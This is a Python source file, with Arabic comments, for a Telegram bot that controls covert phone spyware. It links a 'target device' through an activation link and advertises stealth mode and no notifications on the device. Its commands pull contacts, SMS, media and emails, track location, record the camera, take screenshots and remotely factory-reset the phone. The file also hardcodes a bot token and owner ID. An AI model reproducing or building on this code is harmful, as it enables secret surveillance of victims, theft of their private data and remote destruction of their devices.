import telebot
import requests
import sqlite3
import uuid
import time
import json
import os
import hashlib
import hmac
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import threading
import logging

# إعدادات الأمان والتخفي
SECURITY_CONFIG = {
    'enable_encryption': True,
    'enable_rate_limit': True,
    'enable_logging': True,
    'max_devices_per_user': 5,
    'session_timeout': 3600,  # ساعة واحدة
    'command_timeout': 30,    # 30 ثانية
    'stealth_mode': True
}

# إعداد التسجيل
if SECURITY_CONFIG['enable_logging']:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('bot.log'),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)

# تهيئة البوت
BOT_TOKEN = "7305811865:AAF_PKkBWEUw-QdLg1ee5Xp7oksTG6XGK8c"
OWNER_USER_ID = 985612253
bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = 'devices.db'
COMMAND_SERVER_URL = 'http://localhost:4000'

# تخزين الجلسات النشطة
active_sessions = {}
command_queue = {}
rate_limit_users = {}

class DeviceManager:
    def __init__(self, db_file: str):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # جدول الأجهزة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT UNIQUE NOT NULL,
                activation_code TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                device_info TEXT,
                capabilities TEXT
            )
        ''')
        
        # جدول الأوامر
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT NOT NULL,
                command_type TEXT NOT NULL,
                parameters TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول سجل النشاط
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # جدول المستخدمين المصرح لهم
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                authorized_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_admin BOOLEAN DEFAULT FALSE
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_device(self, user_id: int, device_id: str, activation_code: str) -> bool:
        """إضافة جهاز جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO devices (user_id, device_id, activation_code, status)
                VALUES (?, ?, ?, ?)
            ''', (user_id, device_id, activation_code, 'pending'))
            
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"خطأ في إضافة الجهاز: {e}")
            return False
    
    def get_user_devices(self, user_id: int) -> List[tuple]:
        """الحصول على أجهزة المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT device_id, status, last_seen, device_info
                FROM devices 
                WHERE user_id = ?
                ORDER BY created_at DESC
            ''', (user_id,))
            
            devices = cursor.fetchall()
            conn.close()
            return devices
        except Exception as e:
            logger.error(f"خطأ في جلب أجهزة المستخدم: {e}")
            return []
    
    def update_device_status(self, device_id: str, status: str, device_info: str = None):
        """تحديث حالة الجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            if device_info:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?, device_info = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_info, device_id))
            else:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث حالة الجهاز: {e}")
    
    def save_command(self, user_id: int, device_id: str, command_type: str, parameters: str = None) -> int:
        """حفظ أمر جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO commands (user_id, device_id, command_type, parameters, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, command_type, parameters, 'pending'))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return command_id
        except Exception as e:
            logger.error(f"خطأ في حفظ الأمر: {e}")
            return None
    
    def update_command_result(self, command_id: int, status: str, result: str = None):
        """تحديث نتيجة الأمر"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE commands 
                SET status = ?, executed_at = ?, result = ?
                WHERE id = ?
            ''', (status, datetime.now(), result, command_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث نتيجة الأمر: {e}")
    
    def log_activity(self, user_id: int, action: str, details: str = None):
        """تسجيل نشاط المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO activity_log (user_id, action, details)
                VALUES (?, ?, ?)
            ''', (user_id, action, details))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تسجيل النشاط: {e}")
    
    def is_user_authorized(self, user_id: int) -> bool:
        """التحقق من صلاحية المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('SELECT id FROM authorized_users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            
            conn.close()
            return result is not None
        except Exception as e:
            logger.error(f"خطأ في التحقق من صلاحية المستخدم: {e}")
            return False
    
    def add_authorized_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, is_admin: bool = False):
        """إضافة مستخدم مصرح له"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (user_id, username, first_name, last_name, is_admin)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, last_name, is_admin))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في إضافة المستخدم المصرح له: {e}")

class CommandExecutor:
    def __init__(self, server_url: str):
        self.server_url = server_url
    
    def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
        """إرسال أمر للجهاز"""
        try:
            payload = {
                'deviceId': device_id,
                'command': command,
                'parameters': parameters or {}
            }
            
            response = requests.post(
                f'{self.server_url}/send-command',
                json=payload,
                timeout=SECURITY_CONFIG['command_timeout']
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}
                
        except requests.exceptions.Timeout:
            return {'error': 'انتهت مهلة الاتصال'}
        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}
    
    def get_device_status(self, device_id: str) -> dict:
        """الحصول على حالة الجهاز"""
        try:
            response = requests.get(
                f'{self.server_url}/device-status/{device_id}',
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}
                
        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}
    
    def get_connected_devices(self) -> dict:
        """الحصول على قائمة الأجهزة المتصلة"""
        try:
            response = requests.get(
                f'{self.server_url}/devices',
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}
                
        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}

class SecurityManager:
    def __init__(self):
        self.rate_limit_window = 60  # دقيقة واحدة
        self.max_requests_per_window = 10
    
    def check_rate_limit(self, user_id: int) -> bool:
        """التحقق من حد الطلبات"""
        current_time = time.time()
        
        if user_id not in rate_limit_users:
            rate_limit_users[user_id] = []
        
        # إزالة الطلبات القديمة
        rate_limit_users[user_id] = [
            req_time for req_time in rate_limit_users[user_id]
            if current_time - req_time < self.rate_limit_window
        ]
        
        # التحقق من عدد الطلبات
        if len(rate_limit_users[user_id]) >= self.max_requests_per_window:
            return False
        
        # إضافة الطلب الحالي
        rate_limit_users[user_id].append(current_time)
        return True
    
    def generate_activation_code(self) -> str:
        """توليد كود تفعيل آمن"""
        return str(uuid.uuid4())[:8].upper()
    
    def hash_data(self, data: str) -> str:
        """تشفير البيانات"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def verify_signature(self, data: str, signature: str, secret: str) -> bool:
        """التحقق من التوقيع"""
        expected_signature = hmac.new(
            secret.encode(),
            data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return hmac.compare_digest(signature, expected_signature)

# تهيئة المدراء
device_manager = DeviceManager(DB_FILE)
command_executor = CommandExecutor(COMMAND_SERVER_URL)
security_manager = SecurityManager()

# إضافة مستخدمين مصرح لهم (يمكن تعديلها حسب الحاجة)
def setup_authorized_users():
    """إعداد المستخدمين المصرح لهم"""
    # إضافة مالك البوت كمسؤول افتراضي
    device_manager.add_authorized_user(
        user_id=OWNER_USER_ID,
        username="owner",
        first_name="مالك البوت",
        last_name="",
        is_admin=True
    )

# معالجة الأوامر
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """معالجة أمر البداية"""
    user_id = message.from_user.id
    
    # التحقق من الصلاحية
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    # التحقق من حد الطلبات
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    welcome_text = """
🤖 **مرحباً بك في بوت التحكم في الأجهزة**

📋 **الأوامر المتاحة:**
• `/link` - ربط جهاز جديد
• `/devices` - عرض الأجهزة المرتبطة
• `/contacts` - نسخ جهات الاتصال
• `/sms` - نسخ الرسائل النصية
• `/media` - نسخ الوسائط
• `/emails` - نسخ الإيميلات
• `/location` - الحصول على الموقع
• `/record` - تسجيل الكاميرا
• `/screenshot` - لقطة شاشة
• `/reset` - إعادة ضبط المصنع
• `/help` - المساعدة

🔒 **النظام محمي ومشفر بالكامل**
    """
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'start_command')

@bot.message_handler(commands=['help'])
def send_help(message):
    """معالجة أمر المساعدة"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    help_text = """
📚 **دليل الاستخدام:**

🔗 **ربط جهاز جديد:**
1. استخدم `/link` لإنشاء كود تفعيل
2. افتح الرابط على الجهاز المستهدف
3. أدخل كود التفعيل
4. انتظر تأكيد الربط

📱 **التحكم في الأجهزة:**
• `/devices` - لعرض الأجهزة المتصلة
• اختر الجهاز من القائمة
• استخدم الأوامر المتاحة

🛡️ **الأمان:**
• جميع الاتصالات مشفرة
• لا توجد إشعارات على الجهاز
• يعمل في الخلفية تلقائياً

⚠️ **ملاحظات مهمة:**
• تأكد من وجود الإنترنت على الجهاز
• قد تحتاج لتفعيل خيارات المطور
• بعض الأوامر تحتاج صلاحيات خاصة
    """
    
    bot.reply_to(message, help_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'help_command')

@bot.message_handler(commands=['link'])
def link_device(message):
    """ربط جهاز جديد"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    # التحقق من عدد الأجهزة
    user_devices = device_manager.get_user_devices(user_id)
    if len(user_devices) >= SECURITY_CONFIG['max_devices_per_user']:
        bot.reply_to(message, f"⚠️ وصلت للحد الأقصى من الأجهزة ({SECURITY_CONFIG['max_devices_per_user']}).")
        return
    
    # توليد كود التفعيل
    activation_code = security_manager.generate_activation_code()
    device_id = f"DEV-{user_id}-{int(time.time())}"
    
    # إضافة الجهاز
    if device_manager.add_device(user_id, device_id, activation_code):
        link_text = f"""
🔗 **ربط جهاز جديد**

📱 **معرف الجهاز:** `{device_id}`
🔑 **كود التفعيل:** `{activation_code}`

📋 **خطوات الربط:**
1. افتح هذا الرابط على الجهاز المستهدف:
   `http://localhost:3000`

2. أدخل كود التفعيل عند الطلب

3. انتظر تأكيد الربط

⚠️ **ملاحظات:**
• احتفظ بكود التفعيل آمناً
• لا تشارك الكود مع أحد
• سيعمل النظام في الخلفية تلقائياً
        """
        
        bot.reply_to(message, link_text, parse_mode='Markdown')
        device_manager.log_activity(user_id, 'link_device', f'device_id: {device_id}')
    else:
        bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")

@bot.message_handler(commands=['devices'])
def list_devices(message):
    """عرض الأجهزة المرتبطة"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        bot.reply_to(message, "📱 ليس لديك أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
        return
    
    devices_text = "📱 **الأجهزة المرتبطة:**\n\n"
    
    for i, (device_id, status, last_seen, device_info) in enumerate(devices, 1):
        status_icon = "🟢" if status == 'active' else "🔴"
        status_text = "متصل" if status == 'active' else "غير متصل"
        
        # تنسيق آخر ظهور
        if last_seen:
            last_seen_dt = datetime.fromisoformat(last_seen)
            time_diff = datetime.now() - last_seen_dt
            if time_diff.days > 0:
                last_seen_text = f"{time_diff.days} يوم"
            elif time_diff.seconds > 3600:
                last_seen_text = f"{time_diff.seconds // 3600} ساعة"
            else:
                last_seen_text = f"{time_diff.seconds // 60} دقيقة"
        else:
            last_seen_text = "غير معروف"
        
        devices_text += f"{i}. {status_icon} **{device_id}**\n"
        devices_text += f"   الحالة: {status_text}\n"
        devices_text += f"   آخر ظهور: {last_seen_text}\n\n"
    
    devices_text += "💡 **للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز**"
    
    bot.reply_to(message, devices_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'list_devices')

@bot.message_handler(commands=['contacts'])
def backup_contacts(message):
    """نسخ جهات الاتصال"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    # الحصول على الأجهزة النشطة
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    # إرسال الأمر للجهاز الأول النشط
    device_id = active_devices[0][0]
    
    # حفظ الأمر
    command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')
    
    # إرسال الأمر للجهاز
    result = command_executor.send_command(device_id, 'backup_contacts')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📞 جاري نسخ جهات الاتصال...\nسيتم إرسال الملف عند الانتهاء.")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'backup_contacts', f'device_id: {device_id}')

@bot.message_handler(commands=['sms'])
def backup_sms(message):
    """نسخ الرسائل النصية"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'backup_sms')
    
    result = command_executor.send_command(device_id, 'backup_sms')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "💬 جاري نسخ الرسائل النصية...\nسيتم إرسال الملف عند الانتهاء.")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'backup_sms', f'device_id: {device_id}')

@bot.message_handler(commands=['media'])
def backup_media(message):
    """نسخ الوسائط"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'backup_media')
    
    result = command_executor.send_command(device_id, 'backup_media')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📸 جاري نسخ الوسائط...\nقد يستغرق هذا وقتاً طويلاً.")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')

@bot.message_handler(commands=['location'])
def get_location(message):
    """الحصول على الموقع"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'get_location')
    
    result = command_executor.send_command(device_id, 'get_location')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📍 جاري الحصول على الموقع...")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'get_location', f'device_id: {device_id}')

@bot.message_handler(commands=['record'])
def record_camera(message):
    """تسجيل الكاميرا"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'record_camera')
    
    # إرسال أمر التسجيل لمدة 30 ثانية
    result = command_executor.send_command(device_id, 'record_camera', {'duration': 30})
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📹 جاري تسجيل الفيديو...\nالمدة: 30 ثانية")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'record_camera', f'device_id: {device_id}')

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    """لقطة شاشة"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'take_screenshot')
    
    result = command_executor.send_command(device_id, 'take_screenshot')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📸 جاري التقاط لقطة الشاشة...")
        device_manager.update_command_result(command_id, 'sent')
    
    device_manager.log_activity(user_id, 'take_screenshot', f'device_id: {device_id}')

@bot.message_handler(commands=['reset'])
def factory_reset(message):
    """إعادة ضبط المصنع"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return
    
    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    
    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return
    
    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'factory_reset')
    
    # تحذير قبل التنفيذ
    warning_text = f"""
⚠️ **تحذير خطير!**

هذا الأمر سيقوم بـ:
• حذف جميع البيانات من الجهاز
• إعادة ضبط الجهاز إلى إعدادات المصنع
• فقدان جميع التطبيقات والملفات

🔒 **معرف الجهاز:** `{device_id}`

هل أنت متأكد من تنفيذ هذا الأمر؟

للتنفيذ، أرسل: `/confirm_reset`
للإلغاء، أرسل: `/cancel_reset`
    """
    
    bot.reply_to(message, warning_text, parse_mode='Markdown')
    
    # حفظ في قائمة الانتظار
    command_queue[user_id] = {
        'command': 'factory_reset',
        'device_id': device_id,
        'command_id': command_id,
        'timestamp': time.time()
    }
    
    device_manager.log_activity(user_id, 'factory_reset_warning', f'device_id: {device_id}')

@bot.message_handler(commands=['confirm_reset'])
def confirm_reset(message):
    """تأكيد إعادة الضبط"""
    user_id = message.from_user.id
    
    if user_id not in command_queue:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")
        return
    
    pending_command = command_queue[user_id]
    
    if pending_command['command'] != 'factory_reset':
        bot.reply_to(message, "❌ الأمر في قائمة الانتظار ليس إعادة ضبط.")
        return
    
    # التحقق من انتهاء مهلة التأكيد (5 دقائق)
    if time.time() - pending_command['timestamp'] > 300:
        del command_queue[user_id]
        bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
        return
    
    device_id = pending_command['device_id']
    command_id = pending_command['command_id']
    
    result = command_executor.send_command(device_id, 'factory_reset')
    
    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "🔄 تم بدء إعادة ضبط المصنع...\n⚠️ سيتم فقدان جميع البيانات!")
        device_manager.update_command_result(command_id, 'sent')
    
    del command_queue[user_id]
    device_manager.log_activity(user_id, 'factory_reset_confirmed', f'device_id: {device_id}')

@bot.message_handler(commands=['cancel_reset'])
def cancel_reset(message):
    """إلغاء إعادة الضبط"""
    user_id = message.from_user.id
    
    if user_id in command_queue:
        del command_queue[user_id]
        bot.reply_to(message, "✅ تم إلغاء إعادة الضبط.")
        device_manager.log_activity(user_id, 'factory_reset_cancelled')
    else:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")

# معالجة الرسائل النصية
@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    """معالجة الرسائل النصية"""
    user_id = message.from_user.id
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return
    
    # التحقق من وجود أمر في قائمة الانتظار
    if user_id in command_queue:
        pending_command = command_queue[user_id]
        if time.time() - pending_command['timestamp'] > 300:
            del command_queue[user_id]
            bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
            return
    
    bot.reply_to(message, "💡 استخدم الأوامر المتاحة. اكتب `/help` للمساعدة.")

# وظيفة تنظيف دوري
def cleanup_old_sessions():
    """تنظيف الجلسات القديمة"""
    while True:
        try:
            current_time = time.time()
            
            # تنظيف الجلسات المنتهية
            expired_sessions = [
                user_id for user_id, session_data in active_sessions.items()
                if current_time - session_data['timestamp'] > SECURITY_CONFIG['session_timeout']
            ]
            
            for user_id in expired_sessions:
                del active_sessions[user_id]
            
            # تنظيف أوامر الانتظار المنتهية
            expired_commands = [
                user_id for user_id, command_data in command_queue.items()
                if current_time - command_data['timestamp'] > 300  # 5 دقائق
            ]
            
            for user_id in expired_commands:
                del command_queue[user_id]
            
            time.sleep(60)  # تنظيف كل دقيقة
            
        except Exception as e:
            logger.error(f"خطأ في تنظيف الجلسات: {e}")
            time.sleep(60)

# بدء خيط التنظيف
cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
cleanup_thread.start()

# إعداد المستخدمين المصرح لهم
setup_authorized_users()

# تشغيل البوت
if __name__ == "__main__":
    logger.info("🚀 بدء تشغيل بوت التحكم في الأجهزة...")
    logger.info("✅ تم تهيئة النظام بنجاح")
    logger.info("🔒 وضع الأمان مفعل")
    logger.info("👻 وضع التخفي مفعل")
    
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        logger.error(f"خطأ في تشغيل البوت: {e}")